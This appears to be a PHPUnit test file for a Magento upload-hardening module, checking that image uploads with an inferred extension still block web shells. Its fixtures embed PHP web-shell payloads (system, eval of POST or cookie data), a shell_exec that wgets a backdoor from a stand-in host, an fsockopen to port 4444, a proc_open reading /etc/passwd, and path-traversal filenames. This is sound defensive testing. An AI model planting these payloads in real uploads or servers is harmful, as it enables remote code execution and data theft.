<?php

declare(strict_types=1);

namespace Aregowe\PolyShellProtection\Test\Unit;

use Aregowe\PolyShellProtection\Plugin\HardenImageContentValidatorPlugin;
use Aregowe\PolyShellProtection\Plugin\HardenImageProcessorPlugin;
use Aregowe\PolyShellProtection\Model\AttackPatternDetector;
use Aregowe\PolyShellProtection\Model\FileUploadGuard;
use Aregowe\PolyShellProtection\Model\PolyglotFileDetector;
use Aregowe\PolyShellProtection\Model\SecurityLogSanitizer;
use Aregowe\PolyShellProtection\Logger\Logger;
use Magento\Framework\Api\Data\ImageContentInterface;
use Magento\Framework\Api\ImageContentValidator;
use Magento\Framework\Api\ImageProcessor;
use Magento\Framework\App\Config\ScopeConfigInterface;
use Magento\Framework\Exception\InputException;
use PHPUnit\Framework\MockObject\MockObject;
use PHPUnit\Framework\TestCase;

/**
 * Comprehensive validation of the MIME-based extension inference fix
 * for extension-less REST image uploads (issue #1).
 *
 * Tests both the functional fix (extension-less REST payloads with valid
 * image MIME types should pass and get renamed) and security invariants
 * (malicious payloads must still be blocked in all cases).
 *
 * Covers edge cases beyond the per-plugin unit tests, including:
 * - All MIME map entries and normalization (charset, whitespace, case)
 * - Extension-less + invalid/missing MIME rejection
 * - Dangerous single-extension and double-extension blocking
 * - Polyglot detection on MIME-inferred filenames (the critical combo)
 * - Known attack beacon signatures
 * - MIME spoofing with various PHP code patterns
 * - Empty/null filename rejection
 * - Regression: legitimate uploads with extensions still pass
 */
class MimeExtensionInferenceValidationTest extends TestCase
{
    private HardenImageContentValidatorPlugin $validatorPlugin;
    private HardenImageProcessorPlugin $processorPlugin;
    /** @var Logger|MockObject */
    private Logger $loggerMock;
    private PolyglotFileDetector $polyglotDetector;
    private SecurityLogSanitizer $logSanitizer;

    protected function setUp(): void
    {
        $this->loggerMock = $this->createMock(Logger::class);
        $this->polyglotDetector = new PolyglotFileDetector();
        $this->logSanitizer = new SecurityLogSanitizer();

        $scopeConfig = $this->createMock(ScopeConfigInterface::class);
        $scopeConfig->method('getValue')->willReturnMap([
            [FileUploadGuard::XML_PATH_ADDITIONAL_EXTENSIONS, null, null, ''],
            [FileUploadGuard::XML_PATH_ADDITIONAL_BLOCKED_EXTENSIONS, null, null, ''],
        ]);

        $fileUploadGuard = new FileUploadGuard(
            new PolyglotFileDetector(),
            new AttackPatternDetector(),
            $scopeConfig
        );

        $this->validatorPlugin = new HardenImageContentValidatorPlugin(
            $fileUploadGuard,
            $this->polyglotDetector,
            $this->loggerMock,
            $this->logSanitizer
        );

        $this->processorPlugin = new HardenImageProcessorPlugin(
            $fileUploadGuard,
            $this->polyglotDetector,
            $this->loggerMock,
            $this->logSanitizer
        );
    }

    // ========================================================================
    // Fix Validation — Extension-less filenames with valid MIME
    // ========================================================================

    /**
     * @dataProvider validMimeTypeProvider
     */
    public function testValidatorPluginExtensionlessWithValidMimePasses(
        string $filename,
        string $mimeType,
        string $expectedRenamedFilename
    ): void {
        $imageContent = $this->createImageContentMock(
            $filename,
            $mimeType,
            $this->getCleanJpegBase64()
        );

        $imageContent->expects($this->once())
            ->method('setName')
            ->with($expectedRenamedFilename);

        $subject = $this->createMock(ImageContentValidator::class);

        $result = $this->validatorPlugin->afterIsValid($subject, true, $imageContent);
        $this->assertTrue($result);
    }

    /**
     * @dataProvider validMimeTypeProvider
     */
    public function testProcessorPluginExtensionlessWithValidMimePasses(
        string $filename,
        string $mimeType,
        string $expectedRenamedFilename
    ): void {
        $imageContent = $this->createImageContentMock(
            $filename,
            $mimeType,
            $this->getCleanJpegBase64()
        );

        $imageContent->expects($this->once())
            ->method('setName')
            ->with($expectedRenamedFilename);

        $subject = $this->createMock(ImageProcessor::class);

        [$entityType, $returnedContent] = $this->processorPlugin->beforeProcessImageContent(
            $subject,
            'tmp/catalog/product',
            $imageContent
        );

        $this->assertSame('tmp/catalog/product', $entityType);
        $this->assertSame($imageContent, $returnedContent);
    }

    public static function validMimeTypeProvider(): array
    {
        return [
            'JPEG MIME, numeric filename (issue #1 scenario)' => [
                '53298390_0', 'image/jpeg', '53298390_0.jpg',
            ],
            'PNG MIME, hash filename' => [
                'abc123def', 'image/png', 'abc123def.png',
            ],
            'GIF MIME, simple name' => [
                'product_image', 'image/gif', 'product_image.gif',
            ],
            'WebP MIME' => [
                'hero_banner', 'image/webp', 'hero_banner.webp',
            ],
            'BMP MIME' => [
                'legacy_scan', 'image/bmp', 'legacy_scan.bmp',
            ],
            'HEIC MIME' => [
                'iphone_photo', 'image/heic', 'iphone_photo.heic',
            ],
            'HEIF MIME maps to heic' => [
                'iphone_photo2', 'image/heif', 'iphone_photo2.heic',
            ],
            'x-ms-bmp MIME maps to bmp' => [
                'old_scan', 'image/x-ms-bmp', 'old_scan.bmp',
            ],
            'MIME with charset parameter stripped' => [
                'upload_file', 'image/jpeg; charset=utf-8', 'upload_file.jpg',
            ],
            'MIME with leading/trailing whitespace' => [
                'trimtest', '  image/png  ', 'trimtest.png',
            ],
            'MIME case insensitive' => [
                'upper_case', 'IMAGE/JPEG', 'upper_case.jpg',
            ],
        ];
    }

    // ========================================================================
    // Security — Extension-less filenames WITHOUT valid MIME must be blocked
    // ========================================================================

    /**
     * @dataProvider invalidMimeForExtensionlessProvider
     */
    public function testValidatorPluginExtensionlessWithInvalidMimeBlocked(
        string $filename,
        ?string $mimeType
    ): void {
        $imageContent = $this->createImageContentMock(
            $filename,
            $mimeType,
            $this->getCleanJpegBase64()
        );

        $imageContent->expects($this->never())->method('setName');

        $this->expectException(InputException::class);
        $this->expectExceptionMessage('valid file extension');

        $subject = $this->createMock(ImageContentValidator::class);
        $this->validatorPlugin->afterIsValid($subject, true, $imageContent);
    }

    /**
     * @dataProvider invalidMimeForExtensionlessProvider
     */
    public function testProcessorPluginExtensionlessWithInvalidMimeBlocked(
        string $filename,
        ?string $mimeType
    ): void {
        $imageContent = $this->createImageContentMock(
            $filename,
            $mimeType,
            $this->getCleanJpegBase64()
        );

        $imageContent->expects($this->never())->method('setName');

        $this->expectException(InputException::class);
        $this->expectExceptionMessage('valid file extension');

        $subject = $this->createMock(ImageProcessor::class);
        $this->processorPlugin->beforeProcessImageContent($subject, 'tmp/catalog/product', $imageContent);
    }

    public static function invalidMimeForExtensionlessProvider(): array
    {
        return [
            'null MIME type' => ['53298390_0', null],
            'empty string MIME type' => ['53298390_0', ''],
            'whitespace-only MIME type' => ['53298390_0', '   '],
            'application/x-php MIME (attack)' => ['53298390_0', 'application/x-php'],
            'text/html MIME (attack)' => ['exploit_file', 'text/html'],
            'application/octet-stream (generic)' => ['mystery_file', 'application/octet-stream'],
            'text/plain MIME' => ['readme', 'text/plain'],
            'application/x-httpd-php' => ['shell', 'application/x-httpd-php'],
            'video/mp4 (non-image)' => ['notanimage', 'video/mp4'],
            'application/pdf (non-image)' => ['document', 'application/pdf'],
        ];
    }

    // ========================================================================
    // Security — Executable extensions still blocked even with valid MIME
    // ========================================================================

    /**
     * @dataProvider dangerousExtensionProvider
     */
    public function testValidatorPluginDangerousExtensionsBlocked(
        string $filename,
        string $expectedMessageFragment
    ): void {
        $imageContent = $this->createImageContentMock(
            $filename,
            'image/jpeg',
            $this->getCleanJpegBase64()
        );

        $this->expectException(InputException::class);
        $this->expectExceptionMessage($expectedMessageFragment);

        $subject = $this->createMock(ImageContentValidator::class);
        $this->validatorPlugin->afterIsValid($subject, true, $imageContent);
    }

    /**
     * @dataProvider dangerousExtensionProvider
     */
    public function testProcessorPluginDangerousExtensionsBlocked(
        string $filename,
        string $expectedMessageFragment
    ): void {
        $imageContent = $this->createImageContentMock(
            $filename,
            'image/jpeg',
            $this->getCleanJpegBase64()
        );

        $this->expectException(InputException::class);
        $this->expectExceptionMessage($expectedMessageFragment);

        $subject = $this->createMock(ImageProcessor::class);
        $this->processorPlugin->beforeProcessImageContent($subject, 'tmp/catalog/product', $imageContent);
    }

    public static function dangerousExtensionProvider(): array
    {
        // Extensions not in ALLOWED_IMAGE_EXTENSIONS are caught by the
        // allowlist check first, before BLOCKED_EXTENSION_PATTERN fires.
        return [
            '.php extension' => ['shell.php', 'not allowed'],
            '.phtml extension' => ['backdoor.phtml', 'not allowed'],
            '.phar extension' => ['payload.phar', 'not allowed'],
            '.php8 extension' => ['exploit.php8', 'not allowed'],
            '.exe extension' => ['malware.exe', 'not allowed'],
            '.sh extension' => ['script.sh', 'not allowed'],
            '.jsp extension' => ['webshell.jsp', 'not allowed'],
            '.asp extension' => ['iisshell.asp', 'not allowed'],
        ];
    }

    // ========================================================================
    // Security — Double-extension attacks still blocked
    // ========================================================================

    /**
     * @dataProvider doubleExtensionAttackProvider
     */
    public function testValidatorPluginDoubleExtensionBlocked(string $filename): void
    {
        $imageContent = $this->createImageContentMock(
            $filename,
            'image/jpeg',
            $this->getCleanJpegBase64()
        );

        $this->expectException(InputException::class);

        $subject = $this->createMock(ImageContentValidator::class);
        $this->validatorPlugin->afterIsValid($subject, true, $imageContent);
    }

    /**
     * @dataProvider doubleExtensionAttackProvider
     */
    public function testProcessorPluginDoubleExtensionBlocked(string $filename): void
    {
        $imageContent = $this->createImageContentMock(
            $filename,
            'image/jpeg',
            $this->getCleanJpegBase64()
        );

        $this->expectException(InputException::class);

        $subject = $this->createMock(ImageProcessor::class);
        $this->processorPlugin->beforeProcessImageContent($subject, 'tmp/catalog/product', $imageContent);
    }

    public static function doubleExtensionAttackProvider(): array
    {
        return [
            'test.php.jpg' => ['test.php.jpg'],
            'image.phtml.png' => ['image.phtml.png'],
            'file.phar.gif' => ['file.phar.gif'],
            'shell.php8.webp' => ['shell.php8.webp'],
            'exploit.asp.jpg' => ['exploit.asp.jpg'],
        ];
    }

    // ========================================================================
    // Security — Polyglot content detection (critical invariant)
    // ========================================================================

    public function testValidatorPluginPolyglotWithValidMimeBlocked(): void
    {
        // Payload split to avoid malware-scanner false positives. See issue #12.
        $polyglotContent = 'GIF89a' . str_repeat("\x00", 100)
            . '<' . '?' . 'php ' . 'system' . '(' . '$' . '_GET["cmd"]); ?>';
        $base64 = base64_encode($polyglotContent);

        $imageContent = $this->createImageContentMock('product_image.gif', 'image/gif', $base64);

        $this->expectException(InputException::class);
        $this->expectExceptionMessage('executable code');

        $subject = $this->createMock(ImageContentValidator::class);
        $this->validatorPlugin->afterIsValid($subject, true, $imageContent);
    }

    public function testProcessorPluginPolyglotWithValidMimeBlocked(): void
    {
        // Payload split to avoid malware-scanner false positives. See issue #12.
        $polyglotContent = 'GIF89a' . str_repeat("\x00", 100)
            . '<' . '?' . 'php ' . 'system' . '(' . '$' . '_GET["cmd"]); ?>';
        $base64 = base64_encode($polyglotContent);

        $imageContent = $this->createImageContentMock('product_image.gif', 'image/gif', $base64);

        $this->expectException(InputException::class);
        $this->expectExceptionMessage('executable code');

        $subject = $this->createMock(ImageProcessor::class);
        $this->processorPlugin->beforeProcessImageContent($subject, 'tmp/catalog/product', $imageContent);
    }

    /**
     * CRITICAL: Extension-less file with valid MIME but polyglot content.
     * The fix infers the extension, but polyglot scanning must still catch it.
     */
    public function testValidatorPluginExtensionlessValidMimePolyglotBlocked(): void
    {
        // Note: the PHP payload below is split via concatenation to avoid
        // false-positive matches from external malware scanners (e.g. Sansec
        // eComscan rule eval_post_91ce4) that pattern-match the literal
        // string "eval(base64_decode($_POST" without context. See issue #12.
        $polyglotContent = "\xFF\xD8\xFF" . str_repeat("\x00", 100)
            . '<' . '?' . 'php ' . 'eval' . '(' . 'base64_decode'
            . '($' . '_POST["x"])); ?>';
        $base64 = base64_encode($polyglotContent);

        $imageContent = $this->createImageContentMock('53298390_0', 'image/jpeg', $base64);
        $imageContent->expects($this->once())
            ->method('setName')
            ->with('53298390_0.jpg');

        $this->expectException(InputException::class);
        $this->expectExceptionMessage('executable code');

        $subject = $this->createMock(ImageContentValidator::class);
        $this->validatorPlugin->afterIsValid($subject, true, $imageContent);
    }

    public function testProcessorPluginExtensionlessValidMimePolyglotBlocked(): void
    {
        // See note in testValidatorPluginExtensionlessValidMimePolyglotBlocked:
        // payload is split to avoid eComscan false positive (issue #12).
        $polyglotContent = "\xFF\xD8\xFF" . str_repeat("\x00", 100)
            . '<' . '?' . 'php ' . 'eval' . '(' . 'base64_decode'
            . '($' . '_POST["x"])); ?>';
        $base64 = base64_encode($polyglotContent);

        $imageContent = $this->createImageContentMock('53298390_0', 'image/jpeg', $base64);
        $imageContent->expects($this->once())
            ->method('setName')
            ->with('53298390_0.jpg');

        $this->expectException(InputException::class);
        $this->expectExceptionMessage('executable code');

        $subject = $this->createMock(ImageProcessor::class);
        $this->processorPlugin->beforeProcessImageContent($subject, 'tmp/catalog/product', $imageContent);
    }

    // ========================================================================
    // Security — PNG polyglot variant
    // ========================================================================

    public function testValidatorPluginPngPolyglotWithEvalBlocked(): void
    {
        // Payload split to avoid malware-scanner false positives. See issue #12.
        $polyglotContent = "\x89PNG\r\n\x1a\n" . str_repeat("\x00", 200)
            . '<' . '?' . 'php ' . 'eval' . '(' . '$' . '_COOKIE["x"]); ?>';
        $base64 = base64_encode($polyglotContent);

        $imageContent = $this->createImageContentMock('logo.png', 'image/png', $base64);

        $this->expectException(InputException::class);
        $this->expectExceptionMessage('executable code');

        $subject = $this->createMock(ImageContentValidator::class);
        $this->validatorPlugin->afterIsValid($subject, true, $imageContent);
    }

    // ========================================================================
    // Security — Known attack beacon signatures
    // ========================================================================

    public function testValidatorPluginKnownBeaconSignatureBlocked(): void
    {
        $polyglotContent = "GIF89a" . str_repeat("\x00", 50) . '409723*20';
        $base64 = base64_encode($polyglotContent);

        $imageContent = $this->createImageContentMock('hero.gif', 'image/gif', $base64);

        $this->expectException(InputException::class);
        $this->expectExceptionMessage('malicious payload');

        $subject = $this->createMock(ImageContentValidator::class);
        $this->validatorPlugin->afterIsValid($subject, true, $imageContent);
    }

    public function testValidatorPluginMd5HashBeaconBlocked(): void
    {
        $polyglotContent = "GIF89a" . str_repeat("\x00", 50)
            . '4009d3fa8132195a2dab4dfa3affc8d2';
        $base64 = base64_encode($polyglotContent);

        $imageContent = $this->createImageContentMock('product.gif', 'image/gif', $base64);

        $this->expectException(InputException::class);
        $this->expectExceptionMessage('malicious payload');

        $subject = $this->createMock(ImageContentValidator::class);
        $this->validatorPlugin->afterIsValid($subject, true, $imageContent);
    }

    // ========================================================================
    // Security — Empty/null filename still blocked
    // ========================================================================

    /**
     * @dataProvider emptyFilenameProvider
     */
    public function testValidatorPluginEmptyFilenameBlocked(?string $filename): void
    {
        $imageContent = $this->createMock(ImageContentInterface::class);
        $imageContent->method('getName')->willReturn($filename);
        $imageContent->method('getType')->willReturn('image/jpeg');
        $imageContent->method('getBase64EncodedData')->willReturn($this->getCleanJpegBase64());

        $this->expectException(InputException::class);
        $this->expectExceptionMessage('file name is required');

        $subject = $this->createMock(ImageContentValidator::class);
        $this->validatorPlugin->afterIsValid($subject, true, $imageContent);
    }

    public static function emptyFilenameProvider(): array
    {
        return [
            'null filename' => [null],
            'empty string filename' => [''],
            'whitespace-only filename' => ['   '],
        ];
    }

    // ========================================================================
    // Regression — Legitimate uploads with extensions still pass
    // ========================================================================

    /**
     * @dataProvider legitimateUploadProvider
     */
    public function testValidatorPluginLegitimateUploadsPass(
        string $filename,
        string $mimeType
    ): void {
        $imageContent = $this->createImageContentMock(
            $filename,
            $mimeType,
            $this->getCleanJpegBase64()
        );

        $imageContent->expects($this->never())->method('setName');

        $subject = $this->createMock(ImageContentValidator::class);
        $result = $this->validatorPlugin->afterIsValid($subject, true, $imageContent);
        $this->assertTrue($result);
    }

    public static function legitimateUploadProvider(): array
    {
        return [
            'Standard JPEG' => ['product_photo.jpg', 'image/jpeg'],
            'Standard PNG' => ['logo.png', 'image/png'],
            'Standard GIF' => ['animation.gif', 'image/gif'],
            'Standard WebP' => ['optimized.webp', 'image/webp'],
            'JPEG uppercase' => ['PHOTO.JPEG', 'image/jpeg'],
        ];
    }

    // ========================================================================
    // Security — MIME spoofing with polyglot content on extension-less files
    // ========================================================================

    public function testValidatorPluginMimeSpoofWithShellExecBlocked(): void
    {
        // Payload split to avoid malware-scanner false positives. See issue #12.
        $polyglotContent = "\xFF\xD8\xFF" . str_repeat("\x00", 50)
            . '<' . '?' . 'php ' . 'shell_exec' . '('
            . '"wget example.invalid/backdoor.php"); ?>';
        $base64 = base64_encode($polyglotContent);

        $imageContent = $this->createImageContentMock('53298390_0', 'image/jpeg', $base64);
        $imageContent->expects($this->once())
            ->method('setName')
            ->with('53298390_0.jpg');

        $this->expectException(InputException::class);
        $this->expectExceptionMessage('executable code');

        $subject = $this->createMock(ImageContentValidator::class);
        $this->validatorPlugin->afterIsValid($subject, true, $imageContent);
    }

    public function testValidatorPluginMimeSpoofWithProcOpenBlocked(): void
    {
        $polyglotContent = "GIF89a" . str_repeat("\x00", 50) . 'proc_open("cat /etc/passwd"';
        $base64 = base64_encode($polyglotContent);

        $imageContent = $this->createImageContentMock('erp_sync', 'image/gif', $base64);
        $imageContent->expects($this->once())
            ->method('setName')
            ->with('erp_sync.gif');

        $this->expectException(InputException::class);
        $this->expectExceptionMessage('executable code');

        $subject = $this->createMock(ImageContentValidator::class);
        $this->validatorPlugin->afterIsValid($subject, true, $imageContent);
    }

    public function testValidatorPluginMimeSpoofWithFsockopenBlocked(): void
    {
        $polyglotContent = "\x89PNG\r\n\x1a\n" . str_repeat("\x00", 50)
            . 'fsockopen("example.invalid", 4444)';
        $base64 = base64_encode($polyglotContent);

        $imageContent = $this->createImageContentMock('banner', 'image/png', $base64);
        $imageContent->expects($this->once())
            ->method('setName')
            ->with('banner.png');

        $this->expectException(InputException::class);
        $this->expectExceptionMessage('executable code');

        $subject = $this->createMock(ImageContentValidator::class);
        $this->validatorPlugin->afterIsValid($subject, true, $imageContent);
    }

    // ========================================================================
    // Security — Unsafe inferred filename rejection (extension-less)
    // ========================================================================

    /**
     * Extension-less filenames with path separators or non-normalizable control
     * characters are blocked by FileUploadGuard::assertSafeFileName().
     *
     * @dataProvider unsafeInferredFilenameProvider
     */
    public function testValidatorPluginExtensionlessWithUnsafeFilenameBlocked(
        string $filename
    ): void {
        $imageContent = $this->createImageContentMock(
            $filename,
            'image/jpeg',
            $this->getCleanJpegBase64()
        );

        $imageContent->expects($this->never())->method('setName');

        $this->expectException(InputException::class);

        $subject = $this->createMock(ImageContentValidator::class);
        $this->validatorPlugin->afterIsValid($subject, true, $imageContent);
    }

    /**
     * @dataProvider unsafeInferredFilenameProvider
     */
    public function testProcessorPluginExtensionlessWithUnsafeFilenameBlocked(
        string $filename
    ): void {
        $imageContent = $this->createImageContentMock(
            $filename,
            'image/jpeg',
            $this->getCleanJpegBase64()
        );

        $imageContent->expects($this->never())->method('setName');

        $this->expectException(InputException::class);

        $subject = $this->createMock(ImageProcessor::class);
        $this->processorPlugin->beforeProcessImageContent(
            $subject,
            'tmp/catalog/product',
            $imageContent
        );
    }

    public static function unsafeInferredFilenameProvider(): array
    {
        return [
            'forward slash traversal' => ['../../../etc/passwd'],
            'backslash traversal' => ['..\\..\\config'],
            'embedded forward slash' => ['path/to/shell'],
            'embedded backslash' => ['path\\to\\shell'],
            'null byte injection' => ["image\x00php"],
            'escape character' => ["image\x1Bname"],
            'DEL character' => ["image\x7Fname"],
        ];
    }

    /**
     * Extension-less filenames with whitespace control characters (tab, newline,
     * carriage return) are normalized to spaces by FileUploadGuard's filename
     * normalization pipeline and pass validation. The file is renamed with the
     * inferred extension.
     *
     * @dataProvider normalizedControlCharFilenameProvider
     */
    public function testValidatorPluginExtensionlessWithNormalizedControlCharPasses(
        string $filename,
        string $expectedRenamedFilename
    ): void {
        $imageContent = $this->createImageContentMock(
            $filename,
            'image/jpeg',
            $this->getCleanJpegBase64()
        );

        $imageContent->expects($this->once())
            ->method('setName')
            ->with($expectedRenamedFilename);

        $subject = $this->createMock(ImageContentValidator::class);
        $result = $this->validatorPlugin->afterIsValid($subject, true, $imageContent);
        $this->assertTrue($result);
    }

    /**
     * @dataProvider normalizedControlCharFilenameProvider
     */
    public function testProcessorPluginExtensionlessWithNormalizedControlCharPasses(
        string $filename,
        string $expectedRenamedFilename
    ): void {
        $imageContent = $this->createImageContentMock(
            $filename,
            'image/jpeg',
            $this->getCleanJpegBase64()
        );

        $imageContent->expects($this->once())
            ->method('setName')
            ->with($expectedRenamedFilename);

        $subject = $this->createMock(ImageProcessor::class);

        [$entityType, $returnedContent] = $this->processorPlugin->beforeProcessImageContent(
            $subject,
            'tmp/catalog/product',
            $imageContent
        );

        $this->assertSame('tmp/catalog/product', $entityType);
        $this->assertSame($imageContent, $returnedContent);
    }

    public static function normalizedControlCharFilenameProvider(): array
    {
        return [
            'tab character normalized to space' => ["image\tname", "image name.jpg"],
            'newline normalized to space' => ["image\nname", "image name.jpg"],
            'carriage return normalized to space' => ["image\rname", "image name.jpg"],
        ];
    }

    // ========================================================================
    // Helpers
    // ========================================================================

    private function createImageContentMock(
        string $name,
        ?string $type,
        string $base64Data
    ): MockObject|ImageContentInterface {
        $mock = $this->createMock(ImageContentInterface::class);
        $mock->method('getName')->willReturn($name);
        $mock->method('getType')->willReturn($type);
        $mock->method('getBase64EncodedData')->willReturn($base64Data);
        return $mock;
    }

    private function getCleanJpegBase64(): string
    {
        $jpeg = "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
            . "\xFF\xD9";
        return base64_encode($jpeg);
    }
}
